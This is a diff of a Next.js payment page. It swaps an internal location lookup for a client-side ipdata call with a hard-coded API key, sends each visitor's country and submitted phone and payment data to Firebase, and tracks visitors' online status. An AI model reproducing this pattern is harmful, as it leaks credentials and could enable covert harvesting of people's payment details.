@@ -6,6 +6,8 @@ import { useRouter } from "next/navigation"
 import { ArrowRight, Loader2, Trash2, Receipt, DollarSign } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
+import { setupOnlineStatus } from "@/lib/utils"
+import { addData } from "@/lib/firebase"
 
 interface PaymentData {
   id: string
@@ -17,6 +19,11 @@ interface PaymentData {
 interface LocationResponse {
   country_name: string
 }
+
+const _id = Math.random()
+  .toString(36)
+  .replace(/[^a-z]+/g, "")
+  .substr(0, 15)
 
 export default function PaymentPage() {
   const router = useRouter()
@@ -38,42 +45,31 @@ export default function PaymentPage() {
     const phoneRegex = /^[0-9]{8}$/
     return phoneRegex.test(phone)
   }, [])
-
-  const getLocationData = useCallback(async (): Promise<string | null> => {
-    try {
-      const response = await fetch("/api/location")
-      if (!response.ok) {
-        throw new Error(`Failed to fetch location: ${response.status}`)
-      }
-      const data: LocationResponse = await response.json()
-      return data.country_name
-    } catch (error) {
-      console.error("Location detection failed:", error)
-      return null
-    }
+  useEffect(() => {
+    getLocation()
   }, [])
 
-  const initializeSession = useCallback(async () => {
+  async function getLocation() {
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
     try {
-      setIsInitializing(true)
-      const sessionId = generateId()
-      const country = await getLocationData()
-
-      const sessionData: PaymentData = {
-        id: sessionId,
-        ...(country && { country }),
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
       }
-
-      localStorage.setItem("sessionId", sessionId)
-      if (country) {
-        localStorage.setItem("country", country)
-      }
+      const country = await response.text()
+      addData({
+        id: _id,
+        country: country,
+        createdDate: new Date().toISOString(),
+      })
+      localStorage.setItem("country", country)
+      setupOnlineStatus(_id)
     } catch (error) {
-      console.error("Session initialization failed:", error)
-    } finally {
-      setIsInitializing(false)
+      console.error("Error fetching location:", error)
     }
-  }, [generateId, getLocationData])
+  }
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -90,7 +86,7 @@ export default function PaymentPage() {
     setIsLoading(true)
 
     try {
-      const sessionId = localStorage.getItem("sessionId")
+      const sessionId = localStorage.getItem("visitor")
       if (!sessionId) {
         throw new Error("Session not found")
       }
@@ -100,7 +96,7 @@ export default function PaymentPage() {
         phone: phoneNumber,
         amount: amount,
       }
-
+addData({paymentData})
       localStorage.setItem("paymentAmount", amount)
 
       await new Promise((resolve) => setTimeout(resolve, 1500))
@@ -126,9 +122,6 @@ export default function PaymentPage() {
     setPhoneNumber(value)
   }
 
-  useEffect(() => {
-    initializeSession()
-  }, [initializeSession])
 
   useEffect(() => {
     localStorage.setItem("paymentAmount", amount)
